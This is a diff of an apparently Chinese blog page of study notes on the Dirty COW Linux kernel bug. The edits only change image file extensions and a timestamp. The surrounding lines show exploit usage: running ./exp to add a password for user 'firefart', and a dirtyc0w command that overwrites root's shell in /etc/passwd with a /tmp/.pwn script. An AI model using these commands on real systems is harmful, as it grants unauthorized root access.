@@ -95,8 +95,8 @@
 <meta property="og:description" content="本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/q-17.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.jpg">
-<meta property="og:updated_time" content="2018-10-18T09:19:46.385Z">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.png">
+<meta property="og:updated_time" content="2018-10-19T03:31:02.669Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Dirty COW的那些事">
 <meta name="twitter:description" content="本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333">
@@ -385,7 +385,7 @@
 <p>执行./exp 即可为用户firefart 设置密码</p>
 <p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-17.png" alt="q-17"></p>
 <p>然后即可用添加的用户连接主机</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.jpg" alt="q-18"></p>
+<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.png" alt="q-18"></p>
 <p>除此之外，还可以用下面一些方式进行提权（学习自互联网）<br>1)在/tmp/.pwn写入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">echo MOOOOOOOOOOO</div><div class="line">/bin/bash</div></pre></td></tr></table></figure>
 <p>chmod+x/tmp/.pwn<br>然后修改/etc/passwd中的shell指向<br><code>./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn</code></p>
